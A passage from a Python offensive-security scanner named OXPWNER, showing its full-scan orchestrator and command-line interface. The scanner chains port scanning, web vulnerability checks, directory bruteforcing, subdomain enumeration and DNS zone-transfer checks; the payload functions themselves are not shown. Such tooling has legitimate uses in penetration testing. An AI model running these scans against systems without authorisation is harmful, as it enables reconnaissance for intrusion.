        log.fail("Cannot reach URL for fingerprinting.")
        return {}
    combined = str(dict(resp.headers)) + body
    detected = {}
    for tech, sigs in TECH_SIGNATURES.items():
        for sig in sigs:
            if sig.lower() in combined.lower():
                detected[tech] = sig
                log.ok(f"  Detected: {C.CYAN}{tech}{C.RST}  (via {sig!r})")
                break
    if not detected:
        log.fail("No known technologies identified.")
    return detected


# ─────────────────────────────────────────────
#  FULL SCAN ORCHESTRATOR
# ─────────────────────────────────────────────
def full_scan(target, url=None):
    report = {
        "target": target,
        "url": url,
        "timestamp": datetime.now().isoformat(),
        "findings": {},
    }
    is_url   = target.startswith("http")
    host     = urllib.parse.urlparse(target).hostname if is_url else target
    scan_url_ = url or (target if is_url else f"http://{target}")

    open_ports = port_scan(host)
    report["findings"]["open_ports"] = open_ports

    tech = tech_fingerprint(scan_url_)
    report["findings"]["technologies"] = tech

    url_findings = scan_url(scan_url_)
    report["findings"]["url_vulnerabilities"] = url_findings

    net_vulns = network_vuln_scan(host, open_ports)
    report["findings"]["network_vulnerabilities"] = net_vulns

    log.section("SECURITY HEADER AUDIT")
    hdr_issues = test_security_headers(scan_url_)
    report["findings"]["header_issues"] = hdr_issues

    dir_findings = dir_bruteforce(scan_url_)
    report["findings"]["directories"] = dir_findings

    domain = host if host and "." in host else None
    if domain:
        subs = enumerate_subdomains(domain)
        report["findings"]["subdomains"] = subs
        dns  = dns_recon(domain)
        report["findings"]["dns"] = dns

    log.section("SCAN SUMMARY")
    print(f"  {C.BOLD}{C.CYAN}Open Ports{C.RST}     : {len(open_ports)}")
    print(f"  {C.BOLD}{C.RED}URL Vulns{C.RST}      : {len(url_findings)}")
    print(f"  {C.BOLD}{C.RED}Network Vulns{C.RST}  : {len(net_vulns)}")
    print(f"  {C.BOLD}{C.GOLD}Header Issues{C.RST}  : {len(hdr_issues)}")
    print(f"  {C.BOLD}{C.GRN}Technologies{C.RST}   : {', '.join(tech.keys()) or 'none'}")

    ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"oxpwner_report_{ts}.json"
    save_report(report, fname)
    print(f"\n  {C.PURP}{'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'}{C.RST}\n")
    return report


# ─────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────
def build_parser():
    p = argparse.ArgumentParser(
        description="OXPWNER — Offensive Security & Vulnerability Analysis Engine",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    sub = p.add_subparsers(dest="command")

    fs = sub.add_parser("full",  help="Full automated scan (ports + URL + network + dirs + DNS)")
    fs.add_argument("target",    help="IP / hostname / URL")
    fs.add_argument("--url",     help="Override base URL for web checks")

    ps = sub.add_parser("ports", help="Port scan only")
    ps.add_argument("host",      help="IP or hostname")
    ps.add_argument("--range",   help="Port range e.g. 1-1024")

    us = sub.add_parser("url",   help="URL vulnerability scan (XSS / SQLi / LFI / CMD / SSRF / Redirect)")
    us.add_argument("url",       help="Target URL")

    ss = sub.add_parser("subs",  help="Subdomain enumeration")
    ss.add_argument("domain",    help="Domain name")

    ds = sub.add_parser("dns",   help="DNS recon + zone transfer check")
    ds.add_argument("domain",    help="Domain name")

    drs = sub.add_parser("dirs", help="Directory / path bruteforce")
    drs.add_argument("url",      help="Base URL")

    fps = sub.add_parser("tech", help="Technology fingerprint")
    fps.add_argument("url",      help="Target URL")

    return p


def main():
    print_banner()
    parser = build_parser()
    args   = parser.parse_args()

    if not args.command:
        parser.print_help()
        print(
            f"\n  {C.GREY}Examples:{C.RST}\n"
            f"  {C.CYAN}python3 oxpwner.py full http://testphp.vulnweb.com{C.RST}\n"
            f"  {C.CYAN}python3 oxpwner.py ports 192.168.1.1 --range 1-1024{C.RST}\n"
            f"  {C.CYAN}python3 oxpwner.py url \"http://example.com/page?id=1\"{C.RST}\n"
            f"  {C.CYAN}python3 oxpwner.py subs example.com{C.RST}\n"
            f"  {C.CYAN}python3 oxpwner.py dns example.com{C.RST}\n"
            f"  {C.CYAN}python3 oxpwner.py dirs http://example.com{C.RST}\n"
            f"  {C.CYAN}python3 oxpwner.py tech http://example.com{C.RST}\n"
        )
        sys.exit(0)

    try:
        if args.command == "full":
            full_scan(args.target, getattr(args, "url", None))
        elif args.command == "ports":
            ports = None
            if args.range:
                lo, hi = map(int, args.range.split("-"))
                ports  = list(range(lo, hi + 1))
            port_scan(args.host, ports)
        elif args.command == "url":
            scan_url(args.url)
        elif args.command == "subs":
            enumerate_subdomains(args.domain)
        elif args.command == "dns":
            dns_recon(args.domain)
        elif args.command == "dirs":
            dir_bruteforce(args.url)
        elif args.command == "tech":
            tech_fingerprint(args.url)

    except KeyboardInterrupt:
        print(f"\n\n  {C.GOLD}[!] Scan interrupted by user.{C.RST}\n")
        sys.exit(0)
    except Exception as e:
        log.fail(f"Unexpected error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
